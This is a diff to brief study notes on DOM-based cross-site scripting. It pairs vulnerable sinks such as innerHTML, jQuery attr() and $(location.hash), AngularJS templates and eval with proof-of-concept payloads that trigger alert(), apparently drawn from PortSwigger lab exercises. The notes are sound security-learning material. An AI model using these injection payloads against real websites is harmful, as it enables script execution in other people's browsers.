@@ -16,5 +16,9 @@ TODO: more details and examples
 * `innerHTMl=` /  `<img src=x onerror=alert(1) />` 
 	* or iframe tag bc script tag, svg onload wont work
 * [[jquery]] `attr()` / `?returnUrl=javascript:alert(document.domain)`
+* jquery `$(location.hash)` / `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">` 
+* `ng-app` / `{{$on.constructor('alert(1)')()}}`
+* ```eval('var result = {"results":[],"searchTerm":+payload+"}';')```   /  `\"-alert(1)}//`
+
 
 **List of sinks**: https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
